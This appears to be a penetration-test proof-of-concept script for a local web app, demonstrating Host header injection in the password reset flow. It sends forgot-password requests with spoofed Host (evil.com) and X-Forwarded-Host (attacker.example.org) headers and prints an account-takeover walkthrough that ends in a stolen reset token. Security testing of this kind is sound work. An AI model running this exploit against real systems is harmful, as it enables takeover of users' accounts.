#!/usr/bin/env python3
"""
WSTG-INPV-17: Host Header Injection in Password Reset

Vulnerability: The forgot-password handler in auth.controller.js constructs
the password reset URL using the Host header from the request:

    const resetUrl = `${req.protocol}://${req.get('host')}/reset-password?token=${resetToken}`;

An attacker can send a forgot-password request with a spoofed Host header
(e.g., Host: evil.com). The reset email sent to the victim will contain a
URL pointing to evil.com instead of the legitimate application domain.

When the victim clicks the link, they are directed to the attacker's server,
which can capture the reset token and use it to reset the victim's password.

Impact: Account takeover via token theft. The attacker can steal password
reset tokens by tricking victims into clicking links in legitimate emails
from the application.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"
TARGET_EMAIL = "bob.admin@hireflow.com"  # Use admin account (known working)


def main():
    print("=" * 70)
    print("WSTG-INPV-17: Host Header Injection in Password Reset")
    print("=" * 70)

    # Step 1: Send forgot-password with legitimate Host header
    print("\n[1] Normal forgot-password request (legitimate Host)...")
    resp_normal = requests.post(
        f"{BASE_URL}/api/auth/forgot-password",
        json={"email": TARGET_EMAIL}
    )
    print(f"    Status: {resp_normal.status_code}")
    print(f"    Response: {resp_normal.json()}")

    # Step 2: Send forgot-password with evil Host header
    print("\n[2] Injecting Host: evil.com in forgot-password request...")

    # We need to use a custom Host header. requests normally sets this
    # automatically, but we can override it.
    resp_evil = requests.post(
        f"{BASE_URL}/api/auth/forgot-password",
        json={"email": TARGET_EMAIL},
        headers={
            "Host": "evil.com",
            "Content-Type": "application/json"
        }
    )
    print(f"    Status: {resp_evil.status_code}")
    print(f"    Response: {resp_evil.json()}")

    if resp_evil.status_code == 200:
        print(f"\n    [VULNERABLE] Request accepted with Host: evil.com!")
        print(f"    The reset email sent to {TARGET_EMAIL} will contain:")
        print(f"    http://evil.com/reset-password?token=<token>")
        print(f"    Instead of:")
        print(f"    http://localhost:3000/reset-password?token=<token>")

    # Step 3: Try with X-Forwarded-Host as well
    print("\n[3] Testing with X-Forwarded-Host header...")
    resp_xff = requests.post(
        f"{BASE_URL}/api/auth/forgot-password",
        json={"email": TARGET_EMAIL},
        headers={
            "X-Forwarded-Host": "attacker.example.org",
            "Content-Type": "application/json"
        }
    )
    print(f"    Status: {resp_xff.status_code}")
    print(f"    Response: {resp_xff.json()}")

    # Step 4: Show the same issue in email verification URL
    print("\n[4] Checking registration endpoint for same issue...")
    print("    The register handler also uses req.get('host') for verify-email URL:")
    print("    const verifyUrl = `${req.protocol}://${req.get('host')}/api/auth/verify-email/${token}`;")

    # Step 5: Explain the attack scenario
    print("\n[5] Attack scenario:")
    print("""
    1. Attacker sends:
       POST /api/auth/forgot-password
       Host: evil.com
       Content-Type: application/json
       {"email": "victim@example.com"}

    2. Server generates reset email with URL:
       http://evil.com/reset-password?token=<actual_valid_token>

    3. Victim receives a legitimate email from HireFlow (sent via app's SMTP)
       and clicks the link, thinking it's safe.

    4. Victim's browser goes to evil.com/reset-password?token=<token>

    5. Attacker captures the token from the URL and uses it:
       POST /api/auth/reset-password
       {"token": "<stolen_token>", "password": "attacker_password"}

    6. Attacker now has access to victim's account.
    """)

    # Summary
    print("=" * 70)
    print("RESULT: Host header injection confirmed.")
    print("  - req.get('host') is used in password reset URL construction")
    print("  - Attacker controls the Host header in the request")
    print("  - Reset email contains attacker-controlled URL")
    print("  - Same issue exists in email verification URL")
    print("  - Enables account takeover via token theft")
    print("=" * 70)


if __name__ == "__main__":
    main()
